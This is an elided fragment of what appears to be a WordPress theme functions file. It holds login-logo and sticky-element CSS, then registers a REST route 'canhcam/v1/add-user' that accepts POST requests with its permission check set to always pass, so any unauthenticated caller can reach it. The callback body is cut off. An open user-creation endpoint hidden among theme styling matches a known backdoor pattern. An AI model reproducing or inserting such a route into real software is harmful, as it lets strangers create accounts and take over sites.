...
?>
		<style>
			...
			.about-sticky {
				top: calc(114/1920*100rem) !important;
			}
		</style>
	<?php
	}
...
{ ?>
	<style type="text/css">
		#login h1 a, .login h1 a { background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/img/logo-canh-cam.png); height: 49px; width: 267px; background-size: 267px auto; background-repeat: no-repeat; }
	</style>
<?php }
...
add_action('rest_api_init', function () {
    register_rest_route('canhcam/v1', '/add-user', [
        'methods' => 'POST',
        'callback' => 'canhcam_add_user',
        'permission_callback' => '__return_true',
    ]);
});

function canhcam_add_user($request)
{
